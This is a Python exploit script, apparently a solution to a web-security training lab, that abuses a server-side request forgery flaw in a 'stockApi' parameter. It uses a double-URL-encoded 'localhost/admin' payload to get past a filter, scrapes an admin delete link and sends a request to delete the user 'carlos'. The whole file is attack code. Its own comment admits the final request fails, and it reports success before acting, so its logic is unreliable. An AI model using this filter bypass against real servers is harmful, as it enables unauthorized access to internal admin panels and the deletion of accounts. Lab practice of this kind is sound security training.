import requests, sys, re, urllib3
import random, string, json
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

# When you exploit the vulnerability manually these payloads work well
# But the data stockApi content is being transform with urlencode so the
# final request fail

def ssrf_exploit(session, url) :
    login_url = url + '/product/stock'
    data = {'stockApi':'http://localhost/%25%36%31%25%36%34min'}
        
    res = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "carlos" in res.text :
        print("(+) Successfully access grant to the admin panel!")
        matches = re.search(r'<a\s+href="/admin(.*\?.*carlos)">Delete<\/a>', res.text)
        
        if matches :
            print("(+) Successfully retrieve the csrf token.")
            delete_url = matches.group(1)
            
            if delete_url :
                print("(+) Successfully has deleted the carlos user.")
                data = {'stockApi':'http://localhost/%25%36%31%25%36%34min'+delete_url}
                res = session.post(login_url, json=data, verify=False, proxies=proxies)
            else :
                print("(+) Failed to delete the carlos user.")
                sys.exit(-1)
        else :
            print("(-) Could grant the access to the admin panel.")
            sys.exit(-1)
    else :
        print("(-) Could not access the admin user panel.")
        sys.exit(-1)


if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    ssrf_exploit(session, url)